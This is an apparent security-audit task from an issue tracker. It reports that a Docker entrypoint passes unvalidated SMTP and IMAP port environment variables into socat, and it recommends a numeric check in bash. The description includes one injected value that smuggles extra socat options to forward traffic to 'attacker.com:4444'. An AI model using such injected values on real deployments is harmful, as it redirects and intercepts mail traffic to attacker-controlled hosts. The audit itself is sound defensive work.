---
type: task
title: "SEC-MEDIUM: socat port injection via env vars"
status: open
priority: medium
labels: [security]
created: 2026-02-27
---

# socat port injection via environment variables

**Severity:** Medium

**Location:** `docker/entrypoint.sh:29-30`

**Description:** `${SMTP_PORT}` and `${IMAP_PORT}` are interpolated directly into shell commands without validation. A malicious env var like `CONTAINER_SMTP_PORT="25,fork TCP:attacker.com:4444"` could alter socat behavior.

**Impact:** Port redirection, traffic interception, or outbound connections to attacker-controlled hosts.

**Recommendation:** Validate port values are numeric before use:

```bash
if ! [[ "$SMTP_PORT" =~ ^[0-9]+$ ]]; then
    echo "[entrypoint] ERROR: Invalid SMTP_PORT: $SMTP_PORT"
    exit 1
fi
if ! [[ "$IMAP_PORT" =~ ^[0-9]+$ ]]; then
    echo "[entrypoint] ERROR: Invalid IMAP_PORT: $IMAP_PORT"
    exit 1
fi
```
